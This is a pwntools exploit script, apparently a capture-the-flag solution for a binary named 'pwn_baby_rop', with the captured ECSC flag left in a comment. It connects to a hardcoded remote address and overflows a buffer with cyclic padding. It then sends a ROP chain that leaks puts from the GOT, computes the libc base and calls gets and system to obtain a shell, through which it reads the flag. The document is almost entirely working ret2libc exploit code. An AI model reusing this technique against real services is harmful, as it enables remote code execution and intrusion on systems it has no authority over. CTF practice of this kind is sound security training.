#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('pwn_baby_rop')

host = args.HOST or '104.248.42.88'
port = int(args.PORT or 2000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']

exe.symbols['puts'] = 0x401060
log.info('puts at {}'.format(hex(exe.symbols['puts'])))

io = start()

def leak_bytes(addr):
    io.recvuntil('magic.\n')

    rop = ROP(exe)
    rop.puts(addr)
    rop.raw(0x0040145c)

    log.info(rop.dump())

    io.sendline(cyclic(cyclic_find('qaac')) + rop.chain())

    leak = io.recvline().strip()
    print (leak)
    return leak + "\x00"

def leak_addr(addr):
    leak = u64(leak_bytes(addr).ljust(8, '\x00'))
    log.success('leak {}'.format(hex(leak)))
    return leak

puts = leak_addr(exe.got['puts'])
libc_offset = 554400
base = puts - libc_offset

libc = ELF('./libc-2.31.so')
libc.address = base
log.success('libc at {}'.format(hex(base)))

rop = ROP(libc)
rop.gets(0x0404040 + 0x100)
rop.system(0x0404040 + 0x100)
log.info(rop.dump())

io.recvuntil('magic.\n')
io.sendline(cyclic(cyclic_find('qaac')) + rop.chain())

io.sendline('cat flag\x00')

#libc_start_main = leak_addr(0x403FF0)
#log.success('libc_start_main at {}'.format(hex(libc_start_main)))
#log.success('libc at {}'.format(hex(base)))

# ECSC{261e6aefaddca0758ee01073fd04d4df52c40276ffe9fa24e549eccac63d0654}

io.interactive()

